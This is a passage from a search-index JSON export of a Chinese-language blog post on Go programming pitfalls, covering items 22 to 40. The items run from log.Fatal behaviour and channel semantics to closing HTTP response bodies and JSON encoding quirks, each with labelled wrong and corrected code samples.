","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:22:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"22.log.Fatal 和 log.Panic 不仅仅是日志 级别：初学者 日志库通常提供不同的日志级别。Fatal*()不像那些日志库，如果你调用Fatal*()和Panic*()函数，Go 中的日志包不仅仅做日志。当您的应用调用这些函数时，Go 也会终止您的应用 :-) package main import \"log\" func main() { log.Fatalln(\"Fatal Level: log entry\") //app exits here log.Println(\"Normal Level: log entry\") } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:23:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"23.内置数据结构操作不同步 级别：初学者 尽管 Go 有许多原生支持并发的特性，但并发安全数据集合并不是其中之一 :-) 确保数据集合更新是原子的是您的责任。Goroutines 和 channels 是实现这些原子操作的推荐方式，但如果它对您的应用程序有意义，您也可以利用“sync”包。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:24:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"24.“range”子句中字符串的迭代值 级别：初学者 索引值（“range”操作返回的第一个值）是第二个值中返回的当前“字符”（unicode 码点/符文）的第一个字节的索引。它不是当前“字符”的索引，就像在其他语言中所做的那样。请注意，一个实际角色可能由多个符文表示。如果您需要使用字符，请务必查看“规范”包 (golang.org/x/text/unicode/norm)。 带有字符串变量的for range子句将尝试将数据解释为 UTF8 文本。对于它不理解的任何字节序列，它将返回 0xfffd 符文（又名 unicode 替换字符）而不是实际数据。如果您在字符串变量中存储了任意（非 UTF8 文本）数据，请确保将它们转换为字节切片以按原样获取所有存储的数据。 package main import \"fmt\" func main() { data := \"A\\xfe\\x02\\xff\\x04\" for _,v := range data { fmt.Printf(\"%#x \",v) } //prints: 0x41 0xfffd 0x2 0xfffd 0x4 (not ok) fmt.Println() for _,v := range []byte(data) { fmt.Printf(\"%#x \",v) } //prints: 0x41 0xfe 0x2 0xff 0x4 (good) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:25:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"25.使用“for range”子句遍历map 级别：初学者 如果您希望项目按特定顺序排列（例如，按键值排序），这是一个问题。每次地图迭代都会产生不同的结果。Go 运行时尝试将迭代顺序随机化，但它并不总是成功，因此您可能会得到几个相同的map迭代。连续看到 5 次相同的迭代不要感到惊讶。 package main import \"fmt\" func main() { m := map[string]int{\"one\":1,\"two\":2,\"three\":3,\"four\":4} for k,v := range m { fmt.Println(k,v) } } 如果您使用 Go Playground ( https://play.golang.org/ )，您将始终获得相同的结果，因为除非您进行更改，否则它不会重新编译代码。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:26:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"26.“switch”语句中的失败行为 级别：初学者 默认情况下，“switch”语句中的“case”块会中断。这与其他语言不同，其他语言的默认行为是进入下一个“case”块。 package main import \"fmt\" func main() { isSpace := func(ch byte) bool { switch(ch) { case ' ': //error case '\\t': return true } return false } fmt.Println(isSpace('\\t')) //prints true (ok) fmt.Println(isSpace(' ')) //prints false (not ok) } 您可以通过在每个“case”块末尾使用“fallthrough”语句来强制“case”块通过。您还可以重写您的 switch 语句以在“case”块中使用表达式列表。 package main import \"fmt\" func main() { isSpace := func(ch byte) bool { switch(ch) { case ' ', '\\t': return true } return false } fmt.Println(isSpace('\\t')) //prints true (ok) fmt.Println(isSpace(' ')) //prints true (ok) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:27:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"27.增量和减量 级别：初学者 许多语言都有递增和递减运算符。与其他语言不同，Go 不支持操作的前缀版本。您也不能在表达式中使用这两个运算符。 Fails: package main import \"fmt\" func main() { data := []int{1,2,3} i := 0 ++i //error fmt.Println(data[i++]) //error } Compile Errors: /tmp/sandbox101231828/main.go:8: syntax error: unexpected ++ /tmp/sandbox101231828/main.go:9: syntax error: unexpected ++, expecting : Works: package main import \"fmt\" func main() { data := []int{1,2,3} i := 0 i++ fmt.Println(data[i]) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:28:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"28.按位非运算符 级别：初学者 许多语言使用~一元 NOT 运算符（也称为按位补码），但 Go 重用了 XOR 运算符 ( ^)。 Fails: package main import \"fmt\" func main() { fmt.Println(~2) //error } Compile Error: /tmp/sandbox965529189/main.go:6: the bitwise complement operator is ^ Works: package main import \"fmt\" func main() { var d uint8 = 2 fmt.Printf(\"%08b\\n\",^d) } Go 仍然使用^XOR 运算符，这可能会让一些人感到困惑。 如果您愿意，您可以NOT 0x02用二进制 XOR 运算（例如）来表示一元 NOT 运算（例如0x02 XOR 0xff）。这可以解释为什么^要重用来表示一元 NOT 操作。 Go 还有一个特殊的“AND NOT”位运算符 ( \u0026^)，这增加了 NOT 运算符的混淆。它看起来像是一个A AND (NOT B)不需要括号就可以支持的特殊功能/hack。 package main import \"fmt\" func main() { var a uint8 = 0x82 var b uint8 = 0x02 fmt.Printf(\"%08b [A]\\n\",a) fmt.Printf(\"%08b [B]\\n\",b) fmt.Printf(\"%08b (NOT B)\\n\",^b) fmt.Printf(\"%08b ^ %08b = %08b [B XOR 0xff]\\n\",b,0xff,b ^ 0xff) fmt.Printf(\"%08b ^ %08b = %08b [A XOR B]\\n\",a,b,a ^ b) fmt.Printf(\"%08b \u0026 %08b = %08b [A AND B]\\n\",a,b,a \u0026 b) fmt.Printf(\"%08b \u0026^%08b = %08b [A 'AND NOT' B]\\n\",a,b,a \u0026^ b) fmt.Printf(\"%08b\u0026(^%08b)= %08b [A AND (NOT B)]\\n\",a,b,a \u0026 (^b)) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:29:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"29.运算符优先级差异 级别：初学者 除了“bit clear”操作符（\u0026^）之外，Go 有一组标准操作符，许多其他语言都共享这些操作符。但是，运算符的优先级并不总是相同的。 package main import \"fmt\" func main() { fmt.Printf(\"0x2 \u0026 0x2 + 0x4 -\u003e %#x\\n\",0x2 \u0026 0x2 + 0x4) //prints: 0x2 \u0026 0x2 + 0x4 -\u003e 0x6 //Go: (0x2 \u0026 0x2) + 0x4 //C++: 0x2 \u0026 (0x2 + 0x4) -\u003e 0x2 fmt.Printf(\"0x2 + 0x2 \u003c\u003c 0x1 -\u003e %#x\\n\",0x2 + 0x2 \u003c\u003c 0x1) //prints: 0x2 + 0x2 \u003c\u003c 0x1 -\u003e 0x6 //Go: 0x2 + (0x2 \u003c\u003c 0x1) //C++: (0x2 + 0x2) \u003c\u003c 0x1 -\u003e 0x8 fmt.Printf(\"0xf | 0x2 ^ 0x2 -\u003e %#x\\n\",0xf | 0x2 ^ 0x2) //prints: 0xf | 0x2 ^ 0x2 -\u003e 0xd //Go: (0xf | 0x2) ^ 0x2 //C++: 0xf | (0x2 ^ 0x2) -\u003e 0xf } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:30:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"30.未导出的结构字段未编码 级别：初学者 以小写字母开头的结构字段不会被（json、xml、gob 等）编码，因此当您解码结构时，您最终会在那些未导出的字段中得到零值。 package main import ( \"fmt\" \"encoding/json\" ) type MyData struct { One int two string } func main() { in := MyData{1,\"two\"} fmt.Printf(\"%#v\\n\",in) //prints main.MyData{One:1, two:\"two\"} encoded,_ := json.Marshal(in) fmt.Println(string(encoded)) //prints {\"One\":1} var out MyData json.Unmarshal(encoded,\u0026out) fmt.Printf(\"%#v\\n\",out) //prints main.MyData{One:1, two:\"\"} } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:31:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"31.带有活动 Goroutines 的应用程序退出 级别：初学者 该应用程序不会等待您所有的 goroutine 完成。对于一般初学者来说，这是一个常见的错误。每个人都从某个地方开始，所以犯新手错误并不可耻:-) package main import ( \"fmt\" \"time\" ) func main() { workerCount := 2 for i := 0; i \u003c workerCount; i++ { go doit(i) } time.Sleep(1 * time.Second) fmt.Println(\"all done!\") } func doit(workerId int) { fmt.Printf(\"[%v] is running\\n\",workerId) time.Sleep(3 * time.Second) fmt.Printf(\"[%v] is done\\n\",workerId) } You’ll see: [0] is running [1] is running all done! 最常见的解决方案之一是使用“WaitGroup”变量。它将允许主 goroutine 等待，直到所有工作 goroutine 完成。如果您的应用程序有长时间运行的带有消息处理循环的工作人员，您还需要一种方法来通知这些 goroutine 是时候退出了。您可以向每个worker发送“kill”消息。另一种选择是关闭所有工人正在接收的通道。这是一次向所有 goroutine 发出信号的简单方法。 package main import ( \"fmt\" \"sync\" ) func main() { var wg sync.WaitGroup done := make(chan struct{}) workerCount := 2 for i := 0; i \u003c workerCount; i++ { wg.Add(1) go doit(i,done,wg) } close(done) wg.Wait() fmt.Println(\"all done!\") } func doit(workerId int,done \u003c-chan struct{},wg sync.WaitGroup) { fmt.Printf(\"[%v] is running\\n\",workerId) defer wg.Done() \u003c- done fmt.Printf(\"[%v] is done\\n\",workerId) } 如果你运行这个应用程序，你会看到： [0] is running [0] is done [1] is running [1] is done 看起来worker在主 goroutine 退出之前就完成了。但是! 您还会看到： fatal error: all goroutines are asleep - deadlock! 那不是很好:-) 发生了什么事？为什么会出现死锁？工人们离开了，他们被处决了wg.Done()。该应用程序应该可以工作。 发生死锁是因为每个工作人员都获得了原始“WaitGroup”变量的副本。当worker执行wg.Done()时，它对主 goroutine 中的“WaitGroup”变量没有影响。 package main import ( \"fmt\" \"sync\" ) func main() { var wg sync.WaitGroup done := make(chan struct{}) wq := make(chan interface{}) workerCount := 2 for i := 0; i \u003c workerCount; i++ { wg.Add(1) go doit(i,wq,done,\u0026wg) } for i := 0; i \u003c workerCount; i++ { wq \u003c- i } close(done) wg.Wait() fmt.Println(\"all done!\") } func doit(workerId int, wq \u003c-chan interface{},done \u003c-chan struct{},wg *sync.WaitGroup) { fmt.Printf(\"[%v] is running\\n\",workerId) defer wg.Done() for { select { case m := \u003c- wq: fmt.Printf(\"[%v] m =\u003e %v\\n\",workerId,m) case \u003c- done: fmt.Printf(\"[%v] is done\\n\",workerId) return } } } 现在它按预期工作:-) ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:32:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"32.目标接收器准备好后立即返回到无缓冲通道 级别：初学者 在收件人处理您的消息之前，不会阻止发件人。根据您运行代码的机器，接收者 goroutine 可能有也可能没有足够的时间在发送者继续执行之前处理消息。主进程过早结束，导致消息事件会丢失。 package main import \"fmt\" func main() { ch := make(chan string) go func() { for m := range ch { fmt.Println(\"processed:\",m) } }() ch \u003c- \"cmd.1\" ch \u003c- \"cmd.2\" //won't be processed } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:33:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"33.发送到关闭的通道会导致panic 级别：初学者 从封闭的渠道接收是安全的。接收语句中的ok返回值将被设置为false表示没有接收到数据。如果您从缓冲通道接收，您将首先获取缓冲数据，一旦它为空，ok返回值将为false. 将数据发送到关闭的通道会导致panic。这是一个记录在案的行为，但对于可能期望发送行为类似于接收行为的新 Go 开发人员来说，这并不是很直观。 package main import ( \"fmt\" \"time\" ) func main() { ch := make(chan int) for i := 0; i \u003c 3; i++ { go func(idx int) { ch \u003c- (idx + 1) * 2 }(i) } //get the first result fmt.Println(\u003c-ch) close(ch) //not ok (you still have other senders) //do other work time.Sleep(2 * time.Second) } 根据您的应用程序，修复会有所不同。这可能是一个小的代码更改，或者可能需要更改您的应用程序设计。无论哪种方式，您都需要确保您的应用程序不会尝试将数据发送到关闭的通道。 错误示例可以通过使用特殊的取消通道来向剩余的工作人员发出不再需要他们的结果的信号来修复。 package main import ( \"fmt\" \"time\" ) func main() { ch := make(chan int) done := make(chan struct{}) for i := 0; i \u003c 3; i++ { go func(idx int) { select { case ch \u003c- (idx + 1) * 2: fmt.Println(idx,\"sent result\") case \u003c- done: fmt.Println(idx,\"exiting\") } }(i) } //get first result fmt.Println(\"result:\",\u003c-ch) close(done) //do other work time.Sleep(3 * time.Second) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:34:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"34.使用“零”通道 级别：初学者 nil永远在通道块上发送和接收操作。这是一个有据可查的行为，但对于新的 Go 开发人员来说可能是一个惊喜。 package main import ( \"fmt\" \"time\" ) func main() { var ch chan int for i := 0; i \u003c 3; i++ { go func(idx int) { ch \u003c- (idx + 1) * 2 }(i) } //get first result fmt.Println(\"result:\",\u003c-ch) //do other work time.Sleep(2 * time.Second) } 如果您运行代码，您将看到如下运行时错误：fatal error: all goroutines are asleep - deadlock! 此行为可用作在语句中动态启用和禁用case块的一种方式。select package main import \"fmt\" import \"time\" func main() { inch := make(chan int) outch := make(chan int) go func() { var in \u003c- chan int = inch var out chan \u003c- int var val int for { select { case out \u003c- val: out = nil in = inch case val = \u003c- in: out = outch in = nil } } }() go func() { for r := range outch { fmt.Println(\"result:\",r) } }() time.Sleep(0) inch \u003c- 1 inch \u003c- 2 time.Sleep(3 * time.Second) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:35:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"35.带有值接收器的方法不能更改原始值 级别：初学者 方法接收器就像常规函数参数。如果它被声明为一个值，那么您的函数/方法将获得您的接收器参数的副本。这意味着对接收器进行更改不会影响原始值，除非您的接收器是映射或切片变量，并且您正在更新集合中的项目或者您在接收器中更新的字段是指针。 package main import \"fmt\" type data struct { num int key *string items map[string]bool } func (this *data) pmethod() { this.num = 7 } func (this data) vmethod() { this.num = 8 *this.key = \"v.key\" this.items[\"vmethod\"] = true } func main() { key := \"key.1\" d := data{1,\u0026key,make(map[string]bool)} fmt.Printf(\"num=%v key=%v items=%v\\n\",d.num,*d.key,d.items) //prints num=1 key=key.1 items=map[] d.pmethod() fmt.Printf(\"num=%v key=%v items=%v\\n\",d.num,*d.key,d.items) //prints num=7 key=key.1 items=map[] d.vmethod() fmt.Printf(\"num=%v key=%v items=%v\\n\",d.num,*d.key,d.items) //prints num=7 key=v.key items=map[vmethod:true] } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:36:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"36.关闭 HTTP 响应正文 等级：中级 当您使用标准 http 库发出请求时，您会得到一个 http 响应变量。如果您不阅读响应正文，您仍然需要关闭它。请注意，您也必须为空响应执行此操作。这很容易忘记，尤其是对于新的 Go 开发人员。 一些新的 Go 开发人员确实尝试关闭响应体，但他们做错了地方。 package main import ( \"fmt\" \"net/http\" \"io/ioutil\" ) func main() { resp, err := http.Get(\"https://api.ipify.org?format=json\") defer resp.Body.Close()//not ok if err != nil { fmt.Println(err) return } body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) return } fmt.Println(string(body)) } 此代码适用于成功的请求，但如果 http 请求失败，resp变量可能是nil，这将导致运行时 panic。 关闭响应正文的最常见原因是defer在 http 响应错误检查之后使用调用。 package main import ( \"fmt\" \"net/http\" \"io/ioutil\" ) func main() { resp, err := http.Get(\"https://api.ipify.org?format=json\") if err != nil { fmt.Println(err) return } defer resp.Body.Close()//ok, most of the time :-) body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) return } fmt.Println(string(body)) } 大多数情况下，当您的 http 请求失败时，resp变量将为nil， err为non-nill. 但是，当您遇到重定向失败时，两个变量都将是non-nil. 这意味着您仍然可能会出现泄漏。 non-nil您可以通过在 http 响应错误处理块中添加关闭响应主体的调用来修复此泄漏。另一种选择是使用一次defer调用来关闭所有失败和成功请求的响应主体。 package main import ( \"fmt\" \"net/http\" \"io/ioutil\" ) func main() { resp, err := http.Get(\"https://api.ipify.org?format=json\") if resp != nil { defer resp.Body.Close() } if err != nil { fmt.Println(err) return } body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) return } fmt.Println(string(body)) } 原始 resp.Body.Close() 实现中，还读取并丢弃剩余的响应正文数据。这确保了如果启用了 keepalive http 连接行为，则可以将 http 连接重新用于另一个请求。最新的 http 客户端行为不同。现在，您有责任读取并丢弃剩余的响应数据。如果你不这样做，http 连接可能会被关闭而不是被重用。 如果重用 http 连接对您的应用程序很重要，您可能需要在响应处理逻辑的末尾添加类似这样的内容： _, err = io.Copy(ioutil.Discard, resp.Body) 如果您不立即阅读整个响应正文，则有必要这样做，如果您使用如下代码处理 json API 响应，则可能会发生这种情况： json.NewDecoder(resp.Body).Decode(\u0026data) ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:37:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"37.关闭 HTTP 连接 等级：中级 一些 HTTP 服务器保持网络连接打开一段时间（基于 HTTP 1.1 规范和服务器“保持活动”配置）。默认情况下，标准 http 库仅在目标 HTTP 服务器请求时才会关闭网络连接。这意味着您的应用程序可能会在某些情况下用完套接字/文件描述符。 您可以通过将Close请求变量中的字段设置为 来要求 http 库在请求完成后关闭连接true。 另一种选择是添加Connection请求标头并将其设置为close. 目标 HTTP 服务器也应该使用Connection: close标头响应。当 http 库看到这个响应头时，它也会关闭连接。 package main import ( \"fmt\" \"net/http\" \"io/ioutil\" ) func main() { req, err := http.NewRequest(\"GET\",\"http://golang.org\",nil) if err != nil { fmt.Println(err) return } req.Close = true //or do this: //req.Header.Add(\"Connection\", \"close\") resp, err := http.DefaultClient.Do(req) if resp != nil { defer resp.Body.Close() } if err != nil { fmt.Println(err) return } body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) return } fmt.Println(len(string(body))) } 您还可以全局禁用 http 连接重用。您需要为其创建自定义 http 传输配置。 package main import ( \"fmt\" \"net/http\" \"io/ioutil\" ) func main() { tr := \u0026http.Transport{DisableKeepAlives: true} client := \u0026http.Client{Transport: tr} resp, err := client.Get(\"http://golang.org\") if resp != nil { defer resp.Body.Close() } if err != nil { fmt.Println(err) return } fmt.Println(resp.StatusCode) body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) return } fmt.Println(len(string(body))) } 如果您向同一个 HTTP 服务器发送大量请求，则可以保持网络连接打开。但是，如果您的应用程序在短时间内向许多不同的 HTTP 服务器发送一个或两个请求，最好在您的应用程序收到响应后立即关闭网络连接。增加打开文件的限制也可能是个好主意。但是，正确的解决方案取决于您的应用程序。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:38:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"38.JSON 编码器添加换行符 等级：中级 当您发现测试失败是因为您没有获得预期值时，您正在为 JSON 编码函数编写测试。发生了什么？如果您使用的是 JSON 编码器对象，那么您将在编码的 JSON 对象的末尾获得一个额外的换行符。 package main import ( \"fmt\" \"encoding/json\" \"bytes\" ) func main() { data := map[string]int{\"key\": 1} var b bytes.Buffer json.NewEncoder(\u0026b).Encode(data) raw,_ := json.Marshal(data) if b.String() == string(raw) { fmt.Println(\"same encoded data\") } else { fmt.Printf(\"'%s' != '%s'\\n\",raw,b.String()) //prints: //'{\"key\":1}' != '{\"key\":1}\\n' } } JSON Encoder 对象专为流式传输而设计。使用 JSON 进行流式传输通常意味着以换行符分隔的 JSON 对象，这就是 Encode 方法添加换行符的原因。这是记录在案的行为，但通常被忽视或遗忘。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:39:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"39.JSON 包转义键和字符串值中的特殊 HTML 字符 等级：中级 这是一个记录在案的行为，但您必须仔细阅读所有 JSON 包文档才能了解它。SetEscapeHTML方法描述讨论了 and、小于和大于字符的默认编码行为。 出于多种原因，这是 Go 团队的一个非常不幸的设计决定。首先，您不能为json.Marshal调用禁用此行为。其次，这是一个实施得很糟糕的安全功能，因为它假定进行 HTML 编码足以防止所有 Web 应用程序中的 XSS 漏洞。有很多不同的上下文可以使用数据，每个上下文都需要自己的编码方法。最后，它很糟糕，因为它假定 JSON 的主要用例是网页，默认情况下会破坏配置库和 REST/HTTP API。 package main import ( \"fmt\" \"encoding/json\" \"bytes\" ) func main() { data := \"x \u003c y\" raw,_ := json.Marshal(data) fmt.Println(string(raw)) //prints: \"x \\u003c y\" \u003c- probably not what you expected var b1 bytes.Buffer json.NewEncoder(\u0026b1).Encode(data) fmt.Println(b1.String()) //prints: \"x \\u003c y\" \u003c- probably not what you expected var b2 bytes.Buffer enc := json.NewEncoder(\u0026b2) enc.SetEscapeHTML(false) enc.Encode(data) fmt.Println(b2.String()) //prints: \"x \u003c y\" \u003c- looks better } 给 Go 团队的建议……让它成为一个选择加入。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:40:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"40.将 JSON 数字解组为接口值 等级：中级 默认情况下，float64当您将 JSON 数据解码/解组到接口中时，Go 将 JSON 中的数值视为数字。这意味着以下代码将因 panic 而失败： package main import ( \"encoding/json\" \"fmt\" ) func main() { var data = []byte(`{\"status\": 200}`) var result map[string]interface{} if err := json.Unmarshal(data, \u0026result); err != nil { fmt.Println(\"error:\", err) return } var status = result[\"status\"].(int) //error fmt.Println(\"status value:\",status) } 运行时panic： panic: interface conversion: interface is float64, not int 如果您尝试解码的 JSON 值是一个整数，那么您有多个选项。 选项一：按原样使用浮点值:-) 选项二：将浮点值转换为您需要的整数类型。 package main import ( \"encoding/json\" \"fmt\" ) func main() { var data = []byte(`{\"status\": 200}`) var result map[string]interface{} if err := json.Unmarshal(data, \u0026result); err != nil { fmt.Println(\"error:\", err) return } var status = uint64(result[\"status\"].(float64)) //ok fmt.Println(\"status value:\",status) } 选项三：使用一种类型来解组 JSON，并告诉它使用接口类型Decoder来表示 JSON 数字。Number package main import ( \"encoding/json\" \"bytes\" \"fmt\" ) func main() { var data = []byte(`{\"status\": 200}`) var result map[string]interface{} var decoder = json.NewDecoder(bytes.NewReader(data)) decoder.UseNumber() if err := decoder.Decode(\u0026result); err != nil { fmt.Println(\"error:\", err) return } var status,_ = result[\"status\"].(json.Number).Int64() //ok fmt.Println(\"status value:\",status) } 您可以使用Number值的字符串表示形式将其解组为不同的数字类型： package main import ( \"encoding/json\" \"bytes\" \"fmt\" ) func main() { var data = []byte(`{\"status\": 200}`) var result map[string]interface{} var decoder = json.NewDecoder(bytes.NewReader(data)) decoder.UseNumber() if err := decoder.Decode(\u0026result); err != nil { fmt.Println(\"error:\", err) return } var status uint64 if err := json.Unmarshal([]byte(result[\"status\"].(json.Number).String()), \u0026status); err != nil { fmt.Println(\"error:\", err) return } fmt.Println(\"status value:\",status) } 选项四：使用struct将您的数值映射到您需要的数值类型的类型。 package main import ( \"encoding/json\" \"bytes\" \"fmt\" ) func main() { var data = []byte(`{\"status\": 200}`) var result struct { Status uint64 `json:\"status\"` } if err := json.NewDecoder(bytes.NewReader(data)).Decode(\u0026result); err != nil { fmt.Println(\"error:\", err) return } fmt.Printf(\"result =\u003e %+v\",result) //prints: result =\u003e {Status:200} } 选项五：如果您需要延迟值解码，请使用struct将您的数值映射到类型的 a。json.RawMessage 如果您必须在字段类型或结构可能发生变化的情况下执行条件 JSON 